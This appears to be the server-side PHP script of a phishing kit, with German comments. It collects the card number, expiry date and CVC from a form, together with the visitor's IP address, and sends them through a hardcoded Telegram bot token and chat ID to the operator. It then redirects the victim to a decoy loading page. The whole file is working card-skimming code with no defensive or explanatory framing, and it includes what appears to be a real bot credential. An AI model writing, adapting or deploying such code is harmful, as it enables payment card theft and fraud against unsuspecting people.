<?php
// Hier deine Telegram Bot Daten (ersetze durch deine Werte)
$botToken = '8774738162:AAG5wwzAn4uDk-31PZcYQxkwA3XDnEqIFjk';
$chatId = '-5227546407';

// Daten vom Formular
$cardNumber = isset($_POST['cardNumber']) ? $_POST['cardNumber'] : '';
$expiryDate = isset($_POST['expiryDate']) ? $_POST['expiryDate'] : '';
$cvc = isset($_POST['cvc']) ? $_POST['cvc'] : '';

// IP-Adresse des Nutzers
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Nachricht erstellen
$message = "Neue Kreditkartendaten:\n";
$message .= "Kartennummer: $cardNumber\n";
$message .= "Ablaufdatum: $expiryDate\n";
$message .= "CVC: $cvc\n";
$message .= "IP: " . $ipAddress;

// Telegram API URL
$url = "https://api.telegram.org/bot$botToken/sendMessage";

// Daten für POST
$data = [
    'chat_id' => $chatId,
    'text' => $message,
];

// Nachricht an Telegram senden
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Weiterleitung zu loading4.html
header('Location: ../loading4.html');
exit();
?>